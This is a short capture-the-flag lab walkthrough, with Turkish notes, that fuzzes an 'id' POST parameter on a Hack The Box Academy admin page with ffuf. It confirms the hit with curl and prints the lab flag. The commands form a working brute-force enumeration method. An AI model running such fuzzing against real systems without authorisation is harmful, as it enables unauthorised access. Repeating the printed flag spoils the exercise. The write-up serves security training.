# Value Fuzzing

## Hosts File

```sh
my@attack:~$ echo "94.237.59.180 admin.academy.htb test.academy.htb" | sudo tee -a /etc/hosts
```

## Creating a List

```sh
my@attack:~$ seq 1 1000 > ids.txt
```

## Fuzzing

!!! warning

    Eğer key=value formatı mevcut ise POST Content-Type değeri application/x-www-form-urlencoded olarak ayarlanır.

```sh
my@attack:~$ ffuf -ic -X POST -w ids.txt:FUZZ -u "http://admin.academy.htb:32644/admin/admin.php" -H "Content-Type: application/x-www-form-urlencoded" -d 'id=FUZZ'
```

```output title="Output"
73                      [Status: 200, Size: 787, Words: 218, Lines: 54, Duration: 72ms]
```

## Validating the Value

```sh
my@attack:~$ curl -s 'http://admin.academy.htb:32644/admin/admin.php' -X POST -d 'id=73' | grep HTB
```

```html title="Output"
<div class='center'><p>HTB{p4r4m373r_fuzz1n6_15_k3y!}</p></div>
  <title>HTB Academy</title>
```
